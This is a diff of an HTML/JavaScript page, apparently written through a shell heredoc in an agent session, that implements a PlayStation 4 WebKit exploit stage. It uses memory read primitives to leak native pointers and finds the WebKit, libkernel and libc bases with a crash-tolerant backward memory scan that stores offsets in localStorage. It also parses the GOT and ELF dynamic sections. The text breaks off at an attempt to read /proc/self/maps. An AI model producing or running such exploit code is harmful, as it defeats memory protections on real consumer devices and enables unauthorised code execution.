@@ -1,476 +1,704 @@
+cat > /mnt/user-data/outputs/index.html << 'HTMLEOF'
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 WebKit Exploit (Slopkit Port)</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PS4 WebKit Exploit</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
+  min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:14px}
+h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
+  margin-bottom:4px;text-align:center}
+#fw{font-size:11px;color:#444;margin-bottom:12px;text-align:center}
 
-        body {
-            background: #0a0a0f;
-            color: #e0e0e0;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-        }
+#sb{width:100%;max-width:720px;background:#0c0e18;border:1px solid #1a1d2e;
+  border-radius:6px;padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
+#dot{width:9px;height:9px;border-radius:50%;background:#333;flex-shrink:0;transition:background .3s}
+#dot.r{background:#f0a500;animation:p 1s infinite}
+#dot.ok{background:#00c853}
+#dot.e{background:#ff4444}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
+#st{font-size:12px;color:#bbb;flex:1}
+#bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
+  font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
-        h1 {
-            font-size: 18px;
-            color: #00c8ff;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            margin-bottom: 6px;
-            text-align: center;
-        }
+/* progress bar */
+#pb-wrap{width:100%;max-width:720px;height:5px;background:#111;
+  border-radius:3px;display:none;margin-bottom:6px;overflow:hidden}
+#pb{height:100%;width:0%;background:#3b82f6;transition:width .15s}
 
-        #fw-label {
-            font-size: 11px;
-            color: #666;
-            margin-bottom: 18px;
-            text-align: center;
-            letter-spacing: 2px;
-        }
+/* console */
+#con{width:100%;max-width:720px;height:300px;background:#050508;
+  border:1px solid #161825;border-radius:6px;overflow-y:auto;
+  padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
+.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
+.e{color:#ff5252;font-weight:bold}.d{color:#333}.a{color:#bd93f9}
+.s{color:#00c8ff;border-top:1px solid #161825;margin-top:5px;
+  padding-top:5px;letter-spacing:1px}.f{color:#a78bfa;font-weight:bold}
 
-        /* ---- status bar ---- */
-        #status-bar {
-            width: 100%;
-            max-width: 700px;
-            background: #111118;
-            border: 1px solid #1e1e2e;
-            border-radius: 6px;
-            padding: 12px 16px;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+/* crash badge */
+#crash-badge{width:100%;max-width:720px;background:#3a0d0d;border:2px solid #ff4444;
+  border-radius:6px;padding:10px 14px;display:none;margin-bottom:8px;
+  font-size:12px;color:#ff9999}
 
-        #status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #444;
-            flex-shrink: 0;
-            transition: background 0.3s;
-        }
-        #status-dot.running  { background: #f0a500; animation: pulse 1s infinite; }
-        #status-dot.ok       { background: #00c853; }
-        #status-dot.error    { background: #ff3d3d; }
+/* cards */
+#cards{width:100%;max-width:720px;display:none;
+  grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
+#cards.v{display:grid}
+.card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}
+.card .cl{font-size:9px;color:#444;text-transform:uppercase;letter-spacing:2px;margin-bottom:3px}
+.card .cv{font-size:12px;color:#bd93f9}
+.card .cv.na{color:#222}
 
-        @keyframes pulse {
-            0%,100% { opacity: 1; }
-            50%      { opacity: 0.3; }
-        }
+/* offset scanner table */
+#ofs-wrap{width:100%;max-width:720px;display:none;margin-bottom:8px}
+#ofs-wrap.v{display:block}
+#ofs-title{font-size:10px;color:#444;text-transform:uppercase;letter-spacing:2px;margin-bottom:4px}
+#ofs-table{width:100%;background:#050508;border:1px solid #161825;border-radius:5px;
+  font-size:11px;border-collapse:collapse;overflow:hidden}
+#ofs-table th{background:#0c0e18;padding:5px 10px;text-align:left;color:#555;
+  font-size:9px;letter-spacing:1px}
+#ofs-table td{padding:4px 10px;border-top:1px solid #0f1120;font-family:monospace}
+.ofs-vt{color:#4ade80}.ofs-fn{color:#a78bfa}.ofs-ext{color:#60a5fa}
 
-        #status-text {
-            font-size: 13px;
-            color: #ccc;
-            flex: 1;
-        }
+/* constants */
+#cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
+  border-radius:6px;padding:12px;display:none;margin-bottom:8px;
+  font-size:12px;line-height:1.8;color:#4ade80}
+#cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
+  border-bottom:1px solid #0a2a15;padding-bottom:4px}
+#cbox .cm{color:#555}
 
-        /* ---- attempt counter ---- */
-        #attempt-bar {
-            width: 100%;
-            max-width: 700px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 11px;
-            color: #444;
-            margin-bottom: 12px;
-            padding: 0 2px;
-        }
-
-        /* ---- console ---- */
-        #console {
-            width: 100%;
-            max-width: 700px;
-            height: 400px;
-            background: #06060c;
-            border: 1px solid #1a1a2e;
-            border-radius: 6px;
-            overflow-y: auto;
-            padding: 10px 12px;
-            font-size: 12px;
-            line-height: 1.6;
-            margin-bottom: 12px;
-        }
-
-        .log-line { padding: 1px 0; word-break: break-all; }
-        .log-info    { color: #7ec8e3; }
-        .log-ok      { color: #00c853; font-weight: bold; }
-        .log-warn    { color: #f0a500; }
-        .log-error   { color: #ff5252; font-weight: bold; }
-        .log-dim     { color: #444; }
-        .log-addr    { color: #bd93f9; }
-        .log-section {
-            color: #00c8ff;
-            border-top: 1px solid #1a1a2e;
-            margin-top: 6px;
-            padding-top: 6px;
-            letter-spacing: 1px;
-        }
-
-        /* ---- bases grid ---- */
-        #bases-grid {
-            width: 100%;
-            max-width: 700px;
-            display: none;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin-bottom: 12px;
-        }
-        #bases-grid.visible { display: grid; }
-
-        .base-card {
-            background: #0d0d1a;
-            border: 1px solid #1e1e3a;
-            border-radius: 6px;
-            padding: 10px 14px;
-        }
-        .base-card .label {
-            font-size: 10px;
-            color: #555;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 4px;
-        }
-        .base-card .value {
-            font-size: 13px;
-            color: #bd93f9;
-            word-break: break-all;
-        }
-        .base-card .value.na { color: #333; }
-
-        /* ---- libs list ---- */
-        #libs-list {
-            width: 100%;
-            max-width: 700px;
-            display: none;
-            flex-direction: column;
-            gap: 6px;
-            margin-bottom: 12px;
-        }
-        #libs-list.visible { display: flex; }
-
-        .lib-row {
-            background: #0d0d1a;
-            border: 1px solid #1a1a2e;
-            border-radius: 4px;
-            padding: 8px 12px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-        }
-        .lib-row .lib-name { color: #8be9fd; }
-        .lib-row .lib-base { color: #bd93f9; }
-    </style>
+/* manual entry */
+#manual{width:100%;max-width:720px;background:#0a0c18;border:1px solid #1a1d2e;
+  border-radius:6px;padding:10px 14px;display:none;margin-bottom:8px;font-size:12px}
+#manual input{background:#060810;border:1px solid #2a2d3e;color:#bd93f9;
+  padding:4px 8px;font:12px monospace;border-radius:3px;width:180px}
+#manual button{background:#1e3a5f;border:none;color:#60a5fa;padding:5px 12px;
+  font:12px monospace;border-radius:3px;cursor:pointer;margin-left:6px}
+</style>
 </head>
 <body>
 
 <h1>PS4 WebKit Exploit</h1>
-<div id="fw-label">aguardando firmware...</div>
+<div id="fw">detectando...</div>
 
-<div id="status-bar">
-    <div id="status-dot"></div>
-    <div id="status-text">Inicializando...</div>
+<div id="sb">
+  <div id="dot"></div>
+  <div id="st">Inicializando...</div>
+</div>
+<div id="bars">
+  <span id="ba">tentativa: —</span>
+  <span id="bg">estágio: —</span>
 </div>
 
-<div id="attempt-bar">
-    <span id="attempt-text">tentativa: —</span>
-    <span id="stage-text">estágio: —</span>
+<div id="pb-wrap"><div id="pb"></div></div>
+
+<!-- Crash recovery badge -->
+<div id="crash-badge">
+  ⚠ CRASH RECOVERY DETECTADO — base calculada via boundary.<br>
+  <span id="crash-detail"></span>
 </div>
 
-<div id="console"></div>
+<div id="con"></div>
 
-<div id="bases-grid">
-    <div class="base-card">
-        <div class="label">WebKit Base</div>
-        <div class="value na" id="card-webkit">—</div>
-    </div>
-    <div class="base-card">
-        <div class="label">libkernel Base</div>
-        <div class="value na" id="card-kernel">—</div>
-    </div>
-    <div class="base-card">
-        <div class="label">libc Base</div>
-        <div class="value na" id="card-libc">—</div>
-    </div>
-    <div class="base-card">
-        <div class="label">__ps5NativeCtor</div>
-        <div class="value na" id="card-ctor">—</div>
-    </div>
+<!-- Offset scanner -->
+<div id="ofs-wrap">
+  <div id="ofs-title">Offset Scanner — VTable Slots</div>
+  <table id="ofs-table">
+    <thead>
+      <tr>
+        <th>Slot</th><th>Endereço</th><th>Tipo</th><th>Δ ctor</th><th>Δ vtable</th>
+      </tr>
+    </thead>
+    <tbody id="ofs-body"></tbody>
+  </table>
 </div>
 
-<div id="libs-list"></div>
+<!-- Base cards -->
+<div id="cards">
+  <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
+  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
+  <div class="card"><div class="cl">__ps5NativeCtor</div><div class="cv na" id="c-ct">—</div></div>
+  <div class="card"><div class="cl">ctor RVA</div><div class="cv na" id="c-rv">—</div></div>
+</div>
 
-<!-- ============================================================
-     ES MODULE ENTRY POINT
-     Garante o carregamento exato da mesma instância via ?v=10
-     ============================================================ -->
+<!-- Constants output -->
+<div id="cbox">
+  <div class="ct">// ═══ PS4 FW 13.50 — Constantes (hardcode para próximas runs) ═══</div>
+  <div id="c-out"></div>
+  <div class="cm" style="margin-top:8px">// base = __ps5NativeCtor - WEBKIT_CTOR_RVA  (elimina scan)</div>
+</div>
+
+<!-- Manual entry -->
+<div id="manual">
+  <div style="color:#888;margin-bottom:6px">
+    ▶ Se já conhece o ctor_rva (de uma run anterior), informe para pular o scan:
+  </div>
+  <input id="inp-rva" placeholder="ex: 0x1E29E20" />
+  <button onclick="applyManualRva()">Aplicar</button>
+</div>
+
 <script type="module">
-
-// --- imports dos módulos do slopkit ------------------------------------------
-import { int64 } from './resources/int64.js';
+import { int64 }              from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP } from './resources/mem.js';
-    
-
-// int64 precisa estar global pois mem.js e main.js a referenciam via globalThis
+import { installWindowP }     from './resources/mem.js';
 globalThis.int64 = int64;
 
-// --- UI helpers --------------------------------------------------------------
-const $console    = document.getElementById('console');
-const $dot        = document.getElementById('status-dot');
-const $statusText = document.getElementById('status-text');
-const $attemptTxt = document.getElementById('attempt-text');
-const $stageTxt   = document.getElementById('stage-text');
-const $fwLabel    = document.getElementById('fw-label');
-const $basesGrid  = document.getElementById('bases-grid');
-const $libsList   = document.getElementById('libs-list');
+/* ─── UI ───────────────────────────────────────────────── */
+const $con = document.getElementById('con');
+const $dot = document.getElementById('dot');
+const $st  = document.getElementById('st');
+const $pb  = document.getElementById('pb');
+const $pbw = document.getElementById('pb-wrap');
+const $fw  = document.getElementById('fw');
 
-function log(msg, cls = 'log-info') {
-    const el = document.createElement('div');
-    el.className = 'log-line ' + cls;
-    el.textContent = msg;
-    $console.appendChild(el);
-    $console.scrollTop = $console.scrollHeight;
+function log(m, c='i') {
+  const d = document.createElement('div');
+  d.className = c; d.textContent = m;
+  $con.appendChild(d);
+  $con.scrollTop = $con.scrollHeight;
+  while ($con.children.length > 600) $con.removeChild($con.firstChild);
+}
+function logH(m) { log('=== ' + m + ' ===', 's'); }
+function setStatus(m, s='r') {
+  $st.textContent = m; $dot.className = s;
+}
+function setProg(pct, show=true) {
+  $pbw.style.display = show ? 'block' : 'none';
+  $pb.style.width = Math.min(100, pct) + '%';
+}
+function setCard(id, v) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = v; el.classList.remove('na');
 }
 
-function setStatus(msg, state = 'running') {
-    $statusText.textContent = msg;
-    $dot.className = state;
+/* ─── int64 helpers ─────────────────────────────────────── */
+function i64n(a) { return a.hi * 0x100000000 + a.low; }
+function n64(n) {
+  const hi = Math.floor(n / 0x100000000) >>> 0;
+  const lo = (n - hi * 0x100000000) >>> 0;
+  return new int64(lo, hi);
+}
+function alignDn(a, sz) {
+  return new int64((a.low & ~(sz-1)) >>> 0, a.hi);
+}
+function validPtr(a) { return a.hi > 0 && a.hi <= 0xFF && a.low > 0; }
+function r1(p,a){ return p.read1(a); }
+function r4(p,a){ return p.read4(a) >>> 0; }
+function r8(p,a){ return p.read8(a); }
+function r2(p,a){
+  if (typeof p.read2==='function') return p.read2(a);
+  return p.read4(a) & 0xFFFF;
+}
+function rdStr(p,a,max=128){
+  let s='';
+  for(let i=0;i<max;i++){
+    const c=r1(p,a.add32(i)); if(c===0)break; s+=String.fromCharCode(c);
+  }
+  return s;
 }
 
-function setCard(id, value) {
-    const el = document.getElementById(id);
-    if (!el) return;
-    el.textContent = value;
-    el.classList.remove('na');
+/* ─── CRASH RECOVERY via localStorage ──────────────────────
+   Ideia central:
+   • Antes de cada leitura potencialmente perigosa (abaixo do
+     anchor, em direção ao base), salvamos o offset atual no
+     localStorage.
+   • Se a leitura causar SIGSEGV → PS4 recarrega a página
+     (mesmo processo, sem restart = mesmo ASLR).
+   • No próximo carregamento: o offset salvo indica o boundary.
+     base = anchor - (offset_salvo - PAGE)
+   ──────────────────────────────────────────────────────────── */
+const PAGE = 0x1000;
+
+function crashKey(anchorStr) { return 'ps4c_' + anchorStr; }
+
+function checkCrashRecovery(anchor) {
+  const key = crashKey(anchor.toString());
+  const raw = localStorage.getItem(key);
+  if (!raw) return null;
+  const crashOffset = parseInt(raw);
+  if (!crashOffset || crashOffset < PAGE) return null;
+
+  // O crash aconteceu em anchor - crashOffset → unmapped
+  // Última página mapeada: anchor - (crashOffset - PAGE)
+  const baseN = i64n(anchor) - (crashOffset - PAGE);
+  const base  = n64(baseN);
+
+  const badge = document.getElementById('crash-badge');
+  badge.style.display = 'block';
+  document.getElementById('crash-detail').textContent =
+    'anchor=0x' + anchor.toString()
+    + ' crashOffset=0x' + crashOffset.toString(16)
+    + ' → base=0x' + base.toString();
+
+  log('╔═ CRASH RECOVERY ═════════════════════════════════════', 'f');
+  log('║ crash em: 0x' + n64(i64n(anchor) - crashOffset).toString(), 'w');
+  log('║ base calculada: 0x' + base.toString(), 'ok');
+  log('╚══════════════════════════════════════════════════════', 'f');
+
+  localStorage.removeItem(key);
+  return base;
 }
 
-function addLibRow(name, base) {
-    const row = document.createElement('div');
-    row.className = 'lib-row';
-    row.innerHTML = `<span class="lib-name">${name}</span><span class="lib-base">0x${base}</span>`;
-    $libsList.appendChild(row);
-    $libsList.classList.add('visible');
-}
+/* ─── OFFSET SCANNER (vtable slots) ────────────────────── */
+function runOffsetScanner(p, vtable, ctorPtr) {
+  const vtN   = i64n(vtable);
+  const ctorN = ctorPtr ? i64n(ctorPtr) : 0;
+  const tbody = document.getElementById('ofs-body');
+  tbody.innerHTML = '';
 
-// --- detecta firmware --------------------------------------------------------
-const ua = navigator.userAgent;
-let fwStr = '';
-const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(ua)
-             || /PlayStation 5\/(\d+\.\d+)/.exec(ua);
-if (fwMatch) fwStr = fwMatch[1];
-$fwLabel.textContent = fwStr
-    ? `PlayStation — firmware ${fwStr}`
-    : `UA: ${ua.slice(0, 60)}`;
+  document.getElementById('ofs-wrap').classList.add('v');
+  document.getElementById('cards').classList.add('v');
 
-// --- pegar ponteiro confiável dentro do WebKit (Seguro via JSC) --------------
-function getWebKitPointer(p) {
-    const ctor = globalThis.__ps5NativeCtor;
-    if (typeof ctor === 'number' && ctor > 0x100000000) {
-        const hi = Math.floor(ctor / 0x100000000);
-        const lo = ctor - hi * 0x100000000;
-        const ptr = new int64(lo >>> 0, hi >>> 0);
-        log('[+] __ps5NativeCtor recuperado: 0x' + ptr.toString(), 'log-addr');
-        setCard('card-ctor', '0x' + ptr.toString());
-        return ptr;
+  let minFnAddr = null, minFnN = Infinity;
+  const PAGE4 = 0x4000;
+
+  for (let i = 0; i < 80; i++) {
+    let slot;
+    try { slot = r8(p, vtable.add32(i * 8)); }
+    catch(_) { break; }
+
+    if (!validPtr(slot)) {
+      // show placeholder for slot 0 (RTTI, might be null)
+      if (i === 0) {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `<td>[0]</td><td class="d">null/RTTI</td>
+          <td class="d">—</td><td class="d">—</td><td class="d">—</td>`;
+        tbody.appendChild(tr);
+      }
+      if (i > 3) break; // stop on consecutive invalids
+      continue;
     }
 
-    log('[*] Evitando DOM. Usando fallback seguro via parseInt...', 'log-dim');
-    try {
-        const jsFunc = p.leakval(parseInt);
-        const executable = p.read8(jsFunc.add32(0x18)); 
-        const nativeCtor = p.read8(executable.add32(0x30));
-        
-        if (nativeCtor.hi > 0 && nativeCtor.hi <= 0xFFFF) {
-            log('[+] nativeCtor encontrado: 0x' + nativeCtor.toString(), 'log-addr');
-            setCard('card-ctor', '0x' + nativeCtor.toString());
-            return nativeCtor;
-        }
-    } catch (e) {
-        log('[-] Fallback do parseInt falhou.', 'log-error');
+    const n = i64n(slot);
+    const isVt   = (n & 0xFFF) === 0;   // page-aligned → vtable ptr
+    const isAbove = n >= vtN;             // above vtable → .data/.bss
+    const isFn   = !isVt && !isAbove;    // function ptr in .text
+
+    let cls = 'd', type = '?';
+    if (isVt)    { cls = 'ofs-vt'; type = 'vtable-ptr'; }
+    else if (isAbove) { cls = 'ofs-ext'; type = '.data/.bss'; }
+    else          { cls = 'ofs-fn'; type = 'fn .text'; }
+
+    const dCtor   = ctorN ? (n - ctorN) : 0;
+    const dVtable = n - vtN;
+
+    const tr = document.createElement('tr');
+    tr.innerHTML =
+      `<td class="d">[${i}]</td>` +
+      `<td class="${cls}">0x${slot.toString()}</td>` +
+      `<td class="${cls}">${type}</td>` +
+      `<td class="d">${ctorN ? (dCtor>=0?'+':'')+((dCtor/1024/1024).toFixed(1))+'MB' : '—'}</td>` +
+      `<td class="d">${(dVtable>=0?'+':'')+((dVtable/1024/1024).toFixed(1))+'MB'}</td>`;
+    tbody.appendChild(tr);
+
+    // Track minimum .text fn ptr as scan anchor
+    if (isFn && n < minFnN) {
+      minFnN  = n;
+      minFnAddr = slot;
+    }
+  }
+
+  if (minFnAddr) {
+    log('[+] Âncora scan (min .text fn): 0x' + minFnAddr.toString(), 'ok');
+    log('    vtable→anchor: ' + ((vtN - minFnN)/1024/1024).toFixed(1)
+      + ' MB | ctor→anchor: ' + (ctorN ? ((ctorN-minFnN)/1024/1024).toFixed(1)+'MB' : '—'), 'd');
+  }
+  return minFnAddr;
+}
+
+/* ─── CRASH-TOLERANT SCAN ──────────────────────────────────
+   Salva o offset ANTES de cada leitura.
+   Se crashar → próximo load recupera a base via checkCrashRecovery.
+   Se não crashar → busca ELF magic normalmente.
+   Também detecta quando passamos pelo base (sem ELF magic no SPRX)
+   através do crash na página seguinte.
+   ──────────────────────────────────────────────────────────── */
+async function crashTolerantScan(p, anchor, label = 'WebKit') {
+  const anchorN  = i64n(anchor);
+  const anchorS  = anchor.toString();
+  const key      = crashKey(anchorS);
+  const MAX_OFF  = 40 * 1024 * 1024; // 40 MB — cobre ctor_rva até ~60 MB
+  const YIELD_AT = 512 * PAGE;       // yield a cada 2 MB
+
+  log('[*] Scan crash-tolerant de 0x' + anchor.toString()
+    + ' → -' + (MAX_OFF/1024/1024) + ' MB', 'i');
+  log('[!] Offset salvo antes de cada leitura — crash → recovery automático', 'w');
+
+  setProg(0, true);
+
+  for (let off = PAGE; off <= MAX_OFF; off += PAGE) {
+
+    // ══ SALVA ANTES DA LEITURA ══════════════════════════════
+    localStorage.setItem(key, String(off));
+    // ════════════════════════════════════════════════════════
+
+    const addr = n64(anchorN - off);
+
+    // yield + progress a cada 2 MB
+    if (off % YIELD_AT === 0) {
+      const mb = (off / 1024 / 1024).toFixed(0);
+      log('  -' + mb + 'MB @ 0x' + addr.toString(), 'd');
+      setStatus('Scan ' + label + ': -' + mb + 'MB · 0x' + addr.toString());
+      setProg((off / MAX_OFF) * 100);
+      await new Promise(r => setTimeout(r, 0));
     }
 
+    // Leitura — pode crashar: se crashar, localStorage tem o offset
+    let magic;
+    try { magic = r4(p, addr); }
+    catch(_) {
+      // Raramente chegamos aqui no PS4 (SIGSEGV termina o processo)
+      // mas se chegarmos: marcamos o boundary manualmente
+      log('[!] Exceção JS @ 0x' + addr.toString()
+        + ' — tentando uma página acima', 'w');
+      // base provável = addr + PAGE
+      const base = n64(i64n(addr) + PAGE);
+      localStorage.removeItem(key);
+      return base;
+    }
+
+    // Checa ELF magic (PS4 pode ou não ter no base)
+    if (magic === 0x464C457F) {
+      let cls = 0, enc = 0;
+      try { cls = r1(p, addr.add32(4)); enc = r1(p, addr.add32(5)); } catch(_) {}
+      if (cls === 2 && enc === 1) {
+        localStorage.removeItem(key);
+        log('[+] ELF magic ELF64-LE @ 0x' + addr.toString()
+          + ' (off -0x' + off.toString(16) + ')', 'ok');
+        setProg(100);
+        return addr;
+      }
+    }
+  }
+
+  // Ran to completion without crash → base is below MAX_OFF or ELF not mapped
+  localStorage.removeItem(key);
+  setProg(0, false);
+  log('[-] Scan 40 MB completo sem ELF magic e sem crash', 'w');
+  log('    → base além de 40 MB OU header SPRX não mapeado', 'w');
+  log('    → aguardando crash recovery (informe ctor_rva manualmente abaixo)', 'w');
+  document.getElementById('manual').style.display = 'block';
+  return null;
+}
+
+/* ─── ELF PARSE ─────────────────────────────────────────── */
+function parseDynamic(p, base) {
+  try {
+    const e_phoff     = r8(p, base.add32(0x20)).low;
+    const e_phentsize = r2(p, base.add32(0x36));
+    const e_phnum     = r2(p, base.add32(0x38));
+    const DT = {};
+    for (let i = 0; i < Math.min(e_phnum, 32); i++) {
+      const ph = base.add32(e_phoff + i * e_phentsize);
+      if ((r4(p, ph) >>> 0) !== 2 /* PT_DYNAMIC */) continue;
+      const dynBase = base.add32(r8(p, ph.add32(8)).low); // p_offset
+      for (let j = 0; j < 512; j++) {
+        const tag = r8(p, dynBase.add32(j*16)).low;
+        const val = r8(p, dynBase.add32(j*16+8));
+        if (tag === 0) break;
+        DT[tag] = val;
+      }
+      break;
+    }
+    return DT;
+  } catch(e) {
+    log('  parseDynamic erro: ' + e.message, 'e');
     return null;
+  }
 }
 
-// --- LEAK DINÂMICO DE BASES DIRETO NA RAM (Sem offsets estáticos) ------------
-async function leakAllBases(p) {
-    log('', '');
-    log('-- LEAK DINÂMICO DE BASES (RAM) ------------------', 'log-section');
+/* ─── DISCOVER LIBRARIES via GOT externals ──────────────── */
+async function discoverLibs(p, wkBase, DT) {
+  if (!DT || !DT[3]) { log('  DT_PLTGOT ausente', 'w'); return []; }
 
-    const wkPtr = getWebKitPointer(p);
-    if (!wkPtr) {
-        setStatus('Falha: Nenhum ponteiro nativo recuperado.', 'error');
-        return null;
+  const wkN    = i64n(wkBase);
+  const got    = DT[3]; // DT_PLTGOT value
+  const gotBase = wkBase.add32(got.low);
+  const slots  = DT[2] ? Math.floor(DT[2].low / 0x18) + 4 : 96;
+  const libs   = new Map();
+  const MAX_LIB_MB = 8;
+
+  log('[*] GOT @ 0x' + gotBase.toString() + ' — ' + slots + ' slots', 'i');
+
+  for (let i = 3; i < slots; i++) {
+    let entry;
+    try { entry = r8(p, gotBase.add32(i*8)); } catch(_) { continue; }
+
+    const en = i64n(entry);
+    if (!validPtr(entry)) continue;
+    if (en >= wkN && en < wkN + 0x10000000) continue; // within WebKit
+
+    // External pointer → scan backwards for ELF base
+    const anchor2 = alignDn(entry, PAGE);
+    const key2    = crashKey(anchor2.toString() + '_lib');
+    let libBase   = null;
+
+    // Check crash recovery for this specific lib scan
+    const prevOff = parseInt(localStorage.getItem(key2) || '0');
+    if (prevOff > 0) {
+      libBase = n64(i64n(anchor2) - (prevOff - PAGE));
+      localStorage.removeItem(key2);
+      log('  [lib-recovery] 0x' + libBase.toString(), 'ok');
+    } else {
+      for (let off = 0; off <= MAX_LIB_MB*1024*1024; off += PAGE) {
+        localStorage.setItem(key2, String(off + PAGE));
+        const a = n64(i64n(anchor2) - off);
+        let m;
+        try { m = r4(p, a); } catch(_) { libBase = n64(i64n(a)+PAGE); break; }
+        if (m === 0x464C457F) {
+          let c=0,e2=0;
+          try{c=r1(p,a.add32(4));e2=r1(p,a.add32(5));}catch(_){}
+          if (c===2&&e2===1){libBase=a;break;}
+        }
+      }
+      localStorage.removeItem(key2);
     }
 
-    // 1. Calcula base estimada do WebKit alinhando para a página de 16KB (0x4000)
-    const PAGE_SIZE = 0x4000;
-    let alignedLow = wkPtr.low & ~(PAGE_SIZE - 1);
-    let webkitBase = new int64(alignedLow >>> 0, wkPtr.hi);
-    
-    log(`[+] WebKit Base calculada: 0x${webkitBase.toString()}`, 'log-ok');
-    setCard('card-webkit', '0x' + webkitBase.toString());
-    $basesGrid.classList.add('visible');
+    if (!libBase) continue;
+    const key3 = libBase.toString();
+    if (libs.has(key3)) continue;
 
-    log('', '');
-    log('-- INSPECIONANDO IMPORTAÇÕES GOT NA MEMÓRIA ----', 'log-section');
+    // Parse its .dynamic for soname
+    let soname = '<nid>';
+    try {
+      const lDT = parseDynamic(p, libBase);
+      if (lDT && lDT[5] && lDT[14]) {
+        soname = rdStr(p, libBase.add32(lDT[5].low + lDT[14].low));
+      }
+    } catch(_) {}
 
-    let libkernelBase = null;
-    let libcBase = null;
-
-    // Offsets típicos da GOT do WebKit onde os ponteiros de importação residem
-    const GOT_OFFSETS_LIBKERNEL = [0x0350DB88, 0x03500000, 0x02800000];
-    const GOT_OFFSETS_LIBC      = [0x03510238, 0x03510000, 0x02810000];
-
-    // Busca a libkernel na GOT
-    for (const offset of GOT_OFFSETS_LIBKERNEL) {
-        try {
-            const gotSlot = webkitBase.add32(offset);
-            const importedAddr = p.read8(gotSlot);
-            
-            if (importedAddr.hi > 0 && importedAddr.hi <= 0xFFFF && (importedAddr.low & 3) === 0) {
-                const baseLow = importedAddr.low & ~(PAGE_SIZE - 1);
-                libkernelBase = new int64(baseLow >>> 0, importedAddr.hi);
-                log(`[+] Importação libkernel na GOT: 0x${importedAddr.toString()}`, 'log-ok');
-                log(`[+] libkernel Base: 0x${libkernelBase.toString()}`, 'log-addr');
-                setCard('card-kernel', '0x' + libkernelBase.toString());
-                addLibRow('libkernel.sprx', libkernelBase.toString());
-                break;
-            }
-        } catch (_) {}
-    }
-
-    // Busca a libc na GOT
-    for (const offset of GOT_OFFSETS_LIBC) {
-        try {
-            const gotSlot = webkitBase.add32(offset);
-            const importedAddr = p.read8(gotSlot);
-            
-            if (importedAddr.hi > 0 && importedAddr.hi <= 0xFFFF && (importedAddr.low & 3) === 0) {
-                const baseLow = importedAddr.low & ~(PAGE_SIZE - 1);
-                libcBase = new int64(baseLow >>> 0, importedAddr.hi);
-                log(`[+] Importação libc na GOT:      0x${importedAddr.toString()}`, 'log-ok');
-                log(`[+] libc Base:      0x${libcBase.toString()}`, 'log-addr');
-                setCard('card-libc', '0x' + libcBase.toString());
-                addLibRow('libSceLibcInternal.sprx', libcBase.toString());
-                break;
-            }
-        } catch (_) {}
-    }
-
-    const result = {
-        webkitBase,
-        libkernelBase,
-        libcBase
-    };
-
-    log('', '');
-    log('-- RESULTADO FINAL ----------------------------', 'log-section');
-    log(`webkitBase    = 0x${result.webkitBase.toString()}`, 'log-addr');
-    log(`libkernelBase = 0x${result.libkernelBase?.toString() || '?'}`, 'log-addr');
-    log(`libcBase      = 0x${result.libcBase?.toString() || '?'}`, 'log-addr');
-    log('', '');
-    log('✔ Bases expostas em window._exploit', 'log-ok');
-
-    globalThis._exploit = result;
-    return result;
+    libs.set(key3, { base: libBase, soname });
+    log('  [lib] 0x' + key3 + '  ' + soname, 'a');
+    await new Promise(r => setTimeout(r, 0));
+  }
+  return [...libs.values()];
 }
 
-// --- EVENTO do core.js -------------------------------------------------------
-function onCoreEvent(tag, detail, attempt) {
-    if (attempt !== undefined)
-        $attemptTxt.textContent = `tentativa: ${attempt}`;
-    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
+/* ─── MAIN ──────────────────────────────────────────────── */
+async function main(p) {
+  // ── UA ──────────────────────────────────────────────────
+  const ua = navigator.userAgent;
+  const fm = /PlayStation (\d)/i.exec(ua);
+  const fw = /(\d+\.\d+)/.exec(ua);
+  $fw.textContent = (fm?'PS'+fm[1]:ua.slice(0,30)) + (fw?' FW '+fw[1]:'');
+  log('UA: ' + ua.slice(0,80), 'd');
 
-    const VERBOSE = ['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER',
-                     'PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS',
-                     'PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE'];
-    if (VERBOSE.includes(tag)) {
-        log(`  ${tag}: ${detail}`, 'log-dim');
-        return;
-    }
+  /* FASE 1 */
+  logH('FASE 1 — /proc/self/maps');
+  try {
+    const r = await fetch('file:///proc/self/maps');
+    const t = await r.text();
